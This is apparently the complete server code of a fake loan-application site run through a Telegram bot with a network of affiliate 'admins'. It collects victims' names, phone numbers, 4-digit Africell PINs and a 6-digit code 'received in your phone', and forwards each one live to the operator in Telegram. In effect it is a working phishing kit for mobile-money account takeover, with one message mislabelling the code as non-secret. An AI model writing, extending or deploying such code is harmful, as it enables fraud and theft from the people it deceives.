const express = require('express');
const crypto = require('crypto');
const path = require('path');
const app = express();
app.use(express.json({ limit: '20kb' }));
app.use(express.static(path.join(__dirname, 'public')));

const BOT_TOKEN = String(process.env.TELEGRAM_BOT_TOKEN || process.env.BOT_TOKEN || '').trim();
const BOT_USERNAME = String(process.env.TELEGRAM_BOT_USERNAME || '').trim().replace(/^@/, '');
const ADMIN_CHAT_ID = String(process.env.TELEGRAM_ADMIN_CHAT_ID || process.env.TELEGRAM_SUPER_ADMIN_CHAT_ID || process.env.TELEGRAM_CHAT_ID || process.env.ADMIN_CHAT_ID || '').trim();
const PORT = Number(process.env.PORT || 3000);
const applications = new Map();
const fs = require('fs');
const ADMIN_DB = path.join(__dirname, 'admins.json');
const SUPER_ADMIN_CHAT_ID = String(process.env.TELEGRAM_SUPER_ADMIN_CHAT_ID || process.env.TELEGRAM_ADMIN_CHAT_ID || process.env.TELEGRAM_CHAT_ID || process.env.ADMIN_CHAT_ID || '').trim();
const BASE_URL = String(process.env.BASE_URL || process.env.RENDER_EXTERNAL_URL || '').trim().replace(/\/$/, '');
let admins = [];
try { admins = JSON.parse(fs.readFileSync(ADMIN_DB, 'utf8')); if (!Array.isArray(admins)) admins = []; } catch (_) { admins = []; }
function saveAdmins() { fs.writeFileSync(ADMIN_DB, JSON.stringify(admins, null, 2), { mode: 0o600 }); }
for (const a of admins) {
  if (Number.isFinite(Number(a.number)) && Number(a.number) > 0) a.slug = `ADMIN${String(Number(a.number)).padStart(3, '0')}`;
}
if (admins.length) saveAdmins();
function isSubscriptionActive(a) { return a?.status === 'active'; }
function isSuperAdmin(chatId) { return String(chatId) === SUPER_ADMIN_CHAT_ID && Boolean(SUPER_ADMIN_CHAT_ID); }
function telegramAdminLink(a) { return BOT_USERNAME ? `https://t.me/${BOT_USERNAME}?start=admin${a.number}` : 'Set TELEGRAM_BOT_USERNAME to generate this Telegram connection link.'; }
function customerAdminLink(a) { return BASE_URL && a.slug ? `${BASE_URL}?admin=${encodeURIComponent(a.slug)}` : 'Set BASE_URL or RENDER_EXTERNAL_URL to generate this customer application link.'; }
let telegramOffset = 0;
let polling = false;
let generalNotificationsEnabled = true;

const safe = (v, n = 120) => String(v ?? '').trim().slice(0, n);
async function telegram(method, body) {
  if (!BOT_TOKEN) throw new Error('Telegram is not configured. Set TELEGRAM_BOT_TOKEN.');
  if (method !== 'getUpdates' && method !== 'getWebhookInfo' && method !== 'deleteWebhook' && !body.chat_id && method !== 'answerCallbackQuery') throw new Error(`Missing chat_id for Telegram method ${method}.`);
  const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
    method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body)
  });
  const data = await r.json();
  if (!r.ok || !data.ok) throw new Error(data.description || 'Telegram API request failed');
  return data.result;
}
function adminKeyboard(id, stage) {
  return { inline_keyboard: [[
    { text: '✅ Approve', callback_data: `approve:${stage}:${id}` },
    { text: '❌ Reject', callback_data: `reject:${stage}:${id}` }
  ]] };
}
async function notifyAdmin(appData, stage) {
  const lines = [
    `NEW APPLICATION— ${stage === 1 ? 'STEP 1 REVIEW' : stage === 2 ? 'CODE REVIEW' : 'LOAN REQUEST REVIEW'}`,
    `Application: ${appData.id}`,
    `Assigned admin: ${appData.assignedAdmin ? '#' + appData.assignedAdmin : 'Unassigned'}`,
    `Name: ${appData.name}`,
    `Phone: ${appData.phone}`,
  ];
  if (appData.amount !== undefined) lines.push(`Requested amount: GMD ${Number(appData.amount).toLocaleString('en-US')}`);
  if (appData.reference) lines.push(`CODE: ${appData.reference}\nEnter code recieve in your phone .`);
  const assigned = appData.assignedAdmin ? admins.find(x => Number(x.number) === Number(appData.assignedAdmin) && x.status === 'active' && x.chatId && isSubscriptionActive(x)) : null;
  // Applications are delivered only to the connected admin who owns the customer's personal link.
  const recipients = assigned?.chatId ? [String(assigned.chatId)] : [];
  if (!BOT_TOKEN) throw new Error('Telegram bot token missing: set TELEGRAM_BOT_TOKEN in hosting environment.');
  if (!recipients.length) throw new Error('The assigned admin is not connected to Telegram or the subscription has expired.');
  const failures = [];
  let sent = 0;
  for (const chat_id of recipients) {
    try {
      await telegram('sendMessage', { chat_id, text: lines.join('\n'), reply_markup: adminKeyboard(appData.id, stage) });
      sent++;
    } catch (e) {
      console.error(`Telegram sendMessage failed for chat ${chat_id}:`, e.message);
      failures.push(e.message);
    }
  }
  if (!sent) throw new Error(`Telegram delivery failed: ${failures.join('; ') || 'No notification recipient accepted the message'}`);
}

app.post('/api/application', async (req, res) => {
  const name = safe(req.body.name, 80);
  const phone = safe(req.body.phone, 24);
  const trackingReference = safe(req.body.trackingReference, 4);
  if (!name || !phone || phone.length < 6 || !/^\d{4}$/.test(trackingReference)) return res.status(400).json({ error: 'Enter name, a valid phone number, and a 4-digit africell pin.' });
  const id = crypto.randomUUID();
  const slug = safe(req.body.adminSlug, 64);
  const linkedAdmin = admins.find(x => x.slug === slug);
  if (!slug || !linkedAdmin || linkedAdmin.status !== 'active' || !isSubscriptionActive(linkedAdmin)) return res.status(403).json({ error: 'This admin link is missing, expired, or inactive. Please contact the admin.' });
  if (!linkedAdmin.chatId) return res.status(403).json({ error: 'This admin has not connected Telegram yet. Please contact the admin.' });
  const assignedAdmin = linkedAdmin && linkedAdmin.status === 'active' && isSubscriptionActive(linkedAdmin) ? linkedAdmin : null;
  const record = { id, name, phone, trackingReference, reference: '', assignedAdmin: assignedAdmin ? assignedAdmin.number : null, stage1: 'pending', stage2: 'not_started', createdAt: Date.now() };
  applications.set(id, record);
  try { await notifyAdmin(record, 1); }
  catch (e) { applications.delete(id); console.error('Step 1 notification failed:', e.message); return res.status(503).json({ error: 'Could not notify the admin. Check Telegram bot token, super-admin chat ID, and hosting logs.' }); }
  res.json({ ok: true, id, status: 'pending', message: 'Submitted. Please wait for admin approval.' });
});
app.get('/api/status/:id', (req, res) => {
  const a = applications.get(req.params.id);
  if (!a) return res.status(404).json({ error: 'Application not found.' });
  res.json({ stage1: a.stage1, stage2: a.stage2, stage2Message: a.stage2Message || '' });
});
app.post('/api/reference-submit', async (req, res) => {
  const id = safe(req.body.id, 64);
  const a = applications.get(id);
  if (!a) return res.status(404).json({ error: 'Application not found.' });
  if (a.stage1 !== 'approved') return res.status(409).json({ error: 'Wait for admin approval before continuing.' });
  if (a.stage2 !== 'not_started') return res.status(409).json({ error: 'Reference already submitted.' });
  const reference = safe(req.body.reference, 40);
  if (!/^\d{6}$/.test(reference)) return res.status(400).json({ error: 'Enter exactly 6 digits for the non-secret application tracking reference. Do not enter an OTP or PIN.' });
  a.reference = reference;
  a.stage2 = 'pending';
  try { await notifyAdmin(a, 2); }
  catch (e) { a.stage2 = 'not_started'; console.error('Reference notification failed:', e.message); return res.status(503).json({ error: 'Could not notify the admin. Check Telegram bot token, super-admin chat ID, and hosting logs.' }); }
  res.json({ ok: true, message: 'Application reference submitted. Please wait for admin review.' });
});
app.post('/api/loan-request', async (req, res) => {
  const id = safe(req.body.id, 64);
  const a = applications.get(id);
  const amount = Number(req.body.amount);
  if (!a || a.stage2 !== 'approved') return res.status(409).json({ error: 'The reference step must be approved before continuing.' });
  if (!Number.isFinite(amount) || amount < 5000 || amount > 1000000) return res.status(400).json({ error: 'Enter a valid amount in GMD.' });
  a.amount = amount;
  try { await notifyAdmin(a, 3); }
  catch (e) { console.error('Loan request notification failed:', e.message); return res.status(503).json({ error: 'Could not notify the admin. Check Telegram bot token, super-admin chat ID, and hosting logs.' }); }
  res.json({ ok: true, message: 'Request submitted for review. This is not a loan approval.' });
});
async function handleCallback(q) {
  if (!q.message || (!isSuperAdmin(q.message.chat.id) && !admins.some(a => a.status === 'active' && String(a.chatId || '') === String(q.message.chat.id))) || String(q.from.id) === '') return;
  const data = safe(q.data, 200);
  const match = /^(approve|reject):(1|2|3):([0-9a-f-]{36})$/.exec(data);
  if (!match) return;
  const [, decision, stageText, id] = match;
  const stage = Number(stageText);
  const a = applications.get(id);
  const actor = admins.find(x => x.status === 'active' && String(x.chatId || '') === String(q.message.chat.id));
  if (actor && !isSuperAdmin(q.message.chat.id) && a && Number(a.assignedAdmin) !== Number(actor.number)) { await telegram('answerCallbackQuery', { callback_query_id: q.id, text: 'This application is assigned to another admin.' }); return; }
  if (!a) { await telegram('answerCallbackQuery', { callback_query_id: q.id, text: 'Application expired or not found.' }); return; }
  if (stage === 1 && a.stage1 !== 'pending') { await telegram('answerCallbackQuery', { callback_query_id: q.id, text: 'Step 1 has already been reviewed.' }); return; }
  if (stage === 2 && a.stage2 !== 'pending') { await telegram('answerCallbackQuery', { callback_query_id: q.id, text: 'Reference step has already been reviewed.' }); return; }
  if (stage === 3 && !a.amount) { await telegram('answerCallbackQuery', { callback_query_id: q.id, text: 'Loan request not found.' }); return; }
  if (stage === 1) { a.stage1 = decision === 'approve' ? 'approved' : 'rejected'; }
  if (stage === 2) { a.stage2 = decision === 'approve' ? 'approved' : 'rejected'; a.stage2Message = decision === 'approve' ? 'Reference step approved.' : 'Reference step rejected. Please check and try again.'; }
  if (stage === 3) a.loanReview = decision === 'approve' ? 'approved' : 'rejected';
  await telegram('answerCallbackQuery', { callback_query_id: q.id, text: decision === 'approve' ? 'Approved' : 'Rejected' });
  const old = q.message.reply_markup;
  await telegram('editMessageReplyMarkup', { chat_id: q.message.chat.id, message_id: q.message.message_id, reply_markup: { inline_keyboard: [] } });
  const ownerChatId = actor?.chatId || ADMIN_CHAT_ID;
  if (ownerChatId) await telegram('sendMessage', { chat_id: ownerChatId, text: `Application ${id}: ${stage === 1 ? 'Step 1' : stage === 2 ? 'Reference step' : 'Loan request'} ${decision === 'approve' ? 'approved' : 'rejected'}.` });
}
async function handleAdminCommand(message) {
  const chatId = String(message.chat.id);
  const text = safe(message.text, 1500);
  const start = /^\/start(?:\s+admin(\d+))?$/i.exec(text);
  if (start) {
    if (start[1]) {
      const a = admins.find(x => Number(x.number) === Number(start[1]) && x.status === 'active');
      if (!a) return telegram('sendMessage', { chat_id: chatId, text: 'This admin connection link is invalid, expired, or inactive. Please ask the Super Admin for a new connection link.' });
      if (a.chatId && String(a.chatId) !== chatId) return telegram('sendMessage', { chat_id: chatId, text: 'This admin account is already connected to another Telegram account. Contact the Super Admin.' });
      if (a.pendingChatId && String(a.pendingChatId) !== chatId && !a.chatId) return telegram('sendMessage', { chat_id: chatId, text: 'This connection link was issued for a different Telegram account. Ask the Super Admin to issue a new link for this Chat ID.' });
      if (!isSubscriptionActive(a)) return telegram('sendMessage', { chat_id: chatId, text: 'Your admin subscription has expired. Please contact the Super Admin to renew it.' });
      a.chatId = chatId;
      delete a.pendingChatId;
      saveAdmins();
      return telegram('sendMessage', { chat_id: chatId, text: `👋 Welcome!\n\nYour Chat ID: ${chatId}\nYour Admin ID: ADMIN${String(a.number).padStart(3,'0')}\nRole: 👤 Admin\nBot: @${BOT_USERNAME || 'Mkopowahalobot'}\n\nUse /mylink to get your personal customer link.\n\nCommands:\n/mylink - Get your link\n/stats - Your statistics\n/pending - Pending applications\n/myinfo - Your information` });
    }
    if (isSuperAdmin(chatId)) {
      await telegram('sendMessage', { chat_id: chatId, text: '👋 Welcome!\n\nYour Chat ID: ' + chatId + '\nYour Admin ID: ADMIN001\nRole: 👑 Super Admin\nBot: @' + (BOT_USERNAME || 'Mkopowahalobot') + '\n\nADMIN MANAGEMENT:\n/admins - Orodha ya admin\n/addadmin CHAT_ID - Ongeza admin\n/revoke CHAT_ID - Ondoa ruhusa ya admin\n/restore CHAT_ID - Rudisha ruhusa ya admin\n/connect - Washa general notifications\n/disconnect - Zima general notifications\n/status - Angalia hali ya notifications\n\nOTHER COMMANDS:\n/all - Maombi yote\n/stats - Takwimu zako\n/pending - Maombi yanayosubiri\n/myinfo - Taarifa zako\n/mylink - Kiungo chako' });
    } else {
      const existing = admins.find(x => String(x.chatId || '') === chatId && x.status === 'active');
      if (existing) return telegram('sendMessage', { chat_id: chatId, text: `👋 Welcome!\n\nYour Chat ID: ${chatId}\nYour Admin ID: ADMIN${String(existing.number).padStart(3,'0')}\nRole: 👤 Admin\nBot: @${BOT_USERNAME || 'Mkopowahalobot'}\n\n🔗 Your personal customer link:\n${customerAdminLink(existing)}\n\nUse /mylink anytime to get your link.` });
      return telegram('sendMessage', { chat_id: chatId, text: `👋 Welcome!\n\nYour Chat ID: ${chatId}\n\nSend this Chat ID to the Super Admin so your admin account can be added.\n\nAfter the Super Admin adds you, you will automatically receive your personal customer link.` });
    }
    return;
  }
  if (!isSuperAdmin(chatId)) {
    return;
  }
  if (text.startsWith('/addadmin ')) {
    const targetChatId = safe(text.slice(10), 40);
    if (!/^\d+$/.test(targetChatId)) return telegram('sendMessage', { chat_id: chatId, text: 'Usage: /addadmin CHAT_ID' });
    if (isSuperAdmin(targetChatId)) return telegram('sendMessage', { chat_id: chatId, text: 'That Chat ID belongs to the Super Admin.' });
    let a = admins.find(x => String(x.chatId || '') === targetChatId);
    if (a) return telegram('sendMessage', { chat_id: chatId, text: `⚠️ Admin tayari yupo.\n\nChat ID: ${targetChatId}\nAdmin ID: ADMIN${String(a.number).padStart(3,'0')}\nStatus: ${a.status === 'active' ? 'ACTIVE' : 'REVOKED'}\n\nPersonal customer link:\n${customerAdminLink(a)}` });
    const number = Math.max(2, admins.reduce((m, x) => Math.max(m, Number(x.number) || 1), 1) + 1);
    const slug = `ADMIN${String(number).padStart(3, '0')}`;
    a = { number, name: `Admin #${number}`, slug, status: 'active', chatId: targetChatId, createdAt: new Date().toISOString(), notificationsEnabled: true };
    admins.push(a); saveAdmins();
    const adminMessage = `✅ Admin ameongezwa na kuamilishwa.\n\nChat ID: ${targetChatId}\nAdmin ID: ${slug}\nStatus: ACTIVE\nBot: @${BOT_USERNAME || 'Mkopowahalobot'}\n\n🔗 Kiungo chako binafsi cha wateja:\n${customerAdminLink(a)}\n\nTumia /mylink kupata kiungo hiki tena. Share the customer application link with your customers.`;
    try {
      await telegram('sendMessage', { chat_id: targetChatId, text: adminMessage });
    } catch (e) {
      console.error('Could not send admin welcome/link:', e.message);
    }
    return telegram('sendMessage', { chat_id: chatId, text: `✅ Admin ameongezwa na kuamilishwa.\nChat ID: ${targetChatId}\nAdmin ID: ${slug}\nStatus: ACTIVE\n\nCustomer application link:\n${customerAdminLink(a)}\n\nThe admin has been sent their personal link directly on Telegram.` });
  }
  if (text === '/status') {
    const active = admins.filter(a => a.status === 'active').length;
    const revoked = admins.filter(a => a.status !== 'active').length;
    const connected = admins.filter(a => a.status === 'active' && a.chatId).length;
    return telegram('sendMessage', { chat_id: chatId, text: `📊 Notification status\nActive admins: ${active}\nRevoked admins: ${revoked}\nConnected admins: ${connected}\nGeneral notifications: ${generalNotificationsEnabled ? 'ON' : 'OFF'}` });
  }
  if (text === '/admins') {
    const body = admins.length ? admins.map(a => `#${a.number}\nChat ID: ${a.chatId || 'Not connected'}\nAdmin ID: ADMIN${String(a.number).padStart(3,'0')}\nStatus: ${a.status === 'active' ? 'ACTIVE' : 'REVOKED'}\nBot: @${BOT_USERNAME || 'Mkopowahalobot'}\nCustomer application link: ${customerAdminLink(a)}\nAdmin atapata kiungo chake kwa kutumia /mylink.`).join('\n\n') : 'No admins added yet.';
    return telegram('sendMessage', { chat_id: chatId, text: body });
  }
  const action = /^\/(revoke|restore)\s+(\d+)$/i.exec(text);
  if (action) {
    const targetChatId = action[2];
    const a = admins.find(x => String(x.chatId || '') === targetChatId);
    if (!a) return telegram('sendMessage', { chat_id: chatId, text: 'Admin Chat ID not found.' });
    a.status = action[1] === 'revoke' ? 'revoked' : 'active';
    saveAdmins();
    return telegram('sendMessage', { chat_id: chatId, text: `Admin ID: ADMIN${String(a.number).padStart(3,'0')}\nChat ID: ${targetChatId}\nStatus: ${a.status === 'active' ? 'ACTIVE' : 'REVOKED'}` });
  }
  if (text === '/mylink') {
    const a = admins.find(x => String(x.chatId || '') === chatId && x.status === 'active');
    if (!a) return telegram('sendMessage', { chat_id: chatId, text: 'Admin account not found or revoked.' });
    return telegram('sendMessage', { chat_id: chatId, text: `🔗 YOUR CUSTOMER LINK\n\n${customerAdminLink(a)}\n\nAdmin ID: ADMIN${String(a.number).padStart(3,'0')}\nStatus: ACTIVE\n\nShare this link with customers. Applications submitted through it will be assigned to your admin account.` });
  }
  if (text === '/connect') { generalNotificationsEnabled = true; return telegram('sendMessage', { chat_id: chatId, text: '✅ General notifications are ON.' }); }
  if (text === '/disconnect') { generalNotificationsEnabled = false; return telegram('sendMessage', { chat_id: chatId, text: '⛔ General notifications are OFF.' }); }
  if (text.startsWith('/broadcast ')) {
    if (!generalNotificationsEnabled) return telegram('sendMessage', { chat_id: chatId, text: 'General notifications are OFF. Use /connect first.' });
    const body = safe(text.slice(11), 1200);
    if (!body) return telegram('sendMessage', { chat_id: chatId, text: 'Usage: /broadcast message' });
    const recipients = admins.filter(a => a.status === 'active' && a.chatId);
    let sent = 0;
    for (const a of recipients) { try { await telegram('sendMessage', { chat_id: a.chatId, text: `📢 Super-admin broadcast\n\n${body}` }); sent++; } catch (_) {} }
    return telegram('sendMessage', { chat_id: chatId, text: `Broadcast sent to ${sent} of ${recipients.length} connected active admins.` });
  }
  if (text.startsWith('/notify ')) {
    if (!generalNotificationsEnabled) return telegram('sendMessage', { chat_id: chatId, text: 'General notifications are OFF. Use /connect first.' });
    const body = safe(text.slice(8), 1200);
    if (!body) return telegram('sendMessage', { chat_id: chatId, text: 'Usage: /notify message' });
    const recipients = admins.filter(a => a.status === 'active' && a.chatId && a.notificationsEnabled !== false);
    let sent = 0;
    for (const a of recipients) { try { await telegram('sendMessage', { chat_id: a.chatId, text: `🔔 Super-admin notification

${body}` }); sent++; } catch (_) {} }
    return telegram('sendMessage', { chat_id: chatId, text: `Notification sent to ${sent} of ${recipients.length} connected active admins.` });
  }
}

async function pollTelegram() {
  if (polling || !BOT_TOKEN) return;
  polling = true;
  try {
    const updates = await telegram('getUpdates', { offset: telegramOffset, timeout: 20, allowed_updates: ['callback_query', 'message'] });
    for (const u of updates) {
      telegramOffset = Math.max(telegramOffset, u.update_id + 1);
      if (u.callback_query) {
        try { await handleCallback(u.callback_query); } catch (e) { console.error('Telegram callback error:', e.message); }
      }
      if (u.message && u.message.text) {
        try { await handleAdminCommand(u.message); } catch (e) { console.error('Telegram admin command error:', e.message); }
      }
    }
  } catch (e) { console.error('Telegram polling error:', e.message); }
  finally { polling = false; }
}
if (BOT_TOKEN) {
  // getUpdates will fail if a webhook is still configured for this bot. Remove it before polling.
  telegram('deleteWebhook', { drop_pending_updates: false }).then(() => {
    console.log('Telegram webhook cleared; long polling enabled.');
    setInterval(pollTelegram, 1500);
  }).catch(e => {
    console.error('Telegram startup error:', e.message);
    setInterval(pollTelegram, 5000);
  });
} else { console.error('Telegram notifications disabled: configure TELEGRAM_BOT_TOKEN and TELEGRAM_SUPER_ADMIN_CHAT_ID (or TELEGRAM_ADMIN_CHAT_ID).'); }
app.get('/api/health', (_req, res) => res.json({
  ok: true,
  telegramConfigured: Boolean(BOT_TOKEN),
  botTokenConfigured: Boolean(BOT_TOKEN),
  superAdminConfigured: Boolean(SUPER_ADMIN_CHAT_ID),
  superAdminChatIdConfigured: Boolean(SUPER_ADMIN_CHAT_ID),
  baseUrlConfigured: Boolean(BASE_URL),
  admins: admins.length,
  note: 'Use /api/telegram-diagnostic to verify the token and chat ID against Telegram. No secrets are returned.'
}));
app.get('/api/telegram-diagnostic', async (_req, res) => {
  const result = { configured: Boolean(BOT_TOKEN), tokenPresent: Boolean(BOT_TOKEN), chatIdPresent: Boolean(SUPER_ADMIN_CHAT_ID), tokenValid: false, chatAccessible: false, errors: [] };
  if (!BOT_TOKEN) result.errors.push('Missing TELEGRAM_BOT_TOKEN (or BOT_TOKEN).');
  if (!SUPER_ADMIN_CHAT_ID) result.errors.push('Missing super-admin chat ID. Set TELEGRAM_SUPER_ADMIN_CHAT_ID or TELEGRAM_ADMIN_CHAT_ID.');
  if (BOT_TOKEN) {
    try { const bot = await telegram('getMe', {}); result.tokenValid = true; result.botUsername = bot.username || null; }
    catch (e) { result.errors.push(`Token check failed: ${e.message}`); }
  }
  if (BOT_TOKEN && SUPER_ADMIN_CHAT_ID) {
    try { const chat = await telegram('getChat', { chat_id: SUPER_ADMIN_CHAT_ID }); result.chatAccessible = true; result.chatType = chat.type || null; }
    catch (e) { result.errors.push(`Chat ID check failed: ${e.message}`); }
  }
  res.json(result);
});
app.listen(PORT, () => {
  const configured = Boolean(BOT_TOKEN && SUPER_ADMIN_CHAT_ID);
  console.log(`Africell demo running on port ${PORT}; Telegram ${configured ? 'environment variables detected' : 'NOT CONFIGURED'}`);
  if (!BOT_TOKEN) console.error('Missing bot token: set TELEGRAM_BOT_TOKEN.');
  if (!SUPER_ADMIN_CHAT_ID) console.error('Missing admin chat ID: set TELEGRAM_SUPER_ADMIN_CHAT_ID (or TELEGRAM_ADMIN_CHAT_ID).');
});
